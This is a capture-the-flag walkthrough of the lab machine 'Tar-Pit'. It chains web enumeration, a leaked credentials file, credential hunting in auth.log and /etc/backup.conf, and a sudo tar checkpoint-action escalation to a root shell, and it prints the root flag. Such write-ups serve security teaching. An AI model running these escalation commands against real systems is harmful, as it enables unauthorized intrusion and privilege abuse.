# 🚩 Tar-Pit: Boot-to-Root Walkthrough

## 📌 Overview

**Machine Name:** Tar-Pit  
**IP Address:** 192.168.56.102  
**Difficulty:** Intermediate  
**Category:** Linux Boot-to-Root  

**Skills Tested:**
- Web enumeration  
- Credential discovery  
- Log analysis  
- Lateral movement  
- Privilege escalation via GTFOBins  

**Root Flag:**


SECE{T4r_P1t_Esc4p3_Succ3ssful_2026}


---

## 🧠 Challenge Summary

Tar-Pit simulates a restricted Linux environment where no single vulnerability leads directly to root. Instead, multiple small misconfigurations must be chained together, including:

- Sensitive data exposed via a web server  
- Plaintext credentials stored in configuration files  
- Excessive permissions on system logs  
- Unsafe sudo rights on a common binary  

---

## Phase 1: Reconnaissance & Initial Access

### 🔍 Network Scanning

The first step was to identify open services on the target machine.

```bash
nmap -sC -sV -p- 192.168.56.102


Result:

22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    nginx 1.18.0


This revealed SSH and an HTTP service as potential attack vectors.

🌐 Web Enumeration

Visiting the web server displayed a default nginx page. Directory brute-forcing was performed to find hidden files.

dirsearch -u http://192.168.56.102/ -e txt,php,bak


Discovered File:

/dev_notes.txt

📄 Information Disclosure

Accessing the discovered file:

curl http://192.168.56.102/dev_notes.txt


Contents:

TODO:
- Change dev password later
- Current login for testing: dev / dev@2022
- Remember to remove this file before production
- Harper


🚨 Plaintext credentials were exposed through a publicly accessible file.

🔐 SSH Access

Using the leaked credentials:

ssh dev@192.168.56.102


Password:

dev@2022


Initial access to the system was successfully obtained.

Phase 2: Local Enumeration & Log Analysis
👤 User Privileges

Checking group memberships:

id


Output:

uid=1000(dev) gid=1000(dev) groups=dev,adm,lxd


The adm group allows read access to sensitive system logs.

📜 Authentication Log Review

Examining sudo activity:

grep -a "sudo:session" /var/log/auth.log


Output Snippet:

session opened for user root by backup(uid=34)


This revealed a user named backup frequently executing commands as root.

🔍 Identifying the Backup User
grep "x:34:" /etc/passwd


Result:

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin


Despite having a nologin shell, the account still performs privileged operations.

🔑 Credential Discovery

Searching for backup-related configuration files:

find /etc -name "*backup*" 2>/dev/null


Found File: /etc/backup.conf

cat /etc/backup.conf


Contents:

BACKUP_USER=backup
BACKUP_PASS=backup@2022
BACKUP_DIR=/var/backups


⚠️ The configuration file stores credentials in plaintext and is world-readable.

Phase 3: Privilege Escalation
🔄 Switching to Backup User
su backup -s /bin/bash


Password:

backup@2022


User switch was successful.

🔐 Sudo Enumeration
sudo -l


Output:

(ALL) NOPASSWD: /usr/bin/tar


This indicates a critical sudo misconfiguration.

🧨 Exploiting tar (GTFOBins)

The tar binary supports command execution via checkpoint actions.

sudo /usr/bin/tar -cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/bash


A root shell was spawned successfully.

Phase 4: Root Flag Capture
🏁 Reading the Flag
cd /root
ls
cat root.txt


Flag:

SECE{T4r_P1t_Esc4p3_Succ3ssful_2026}
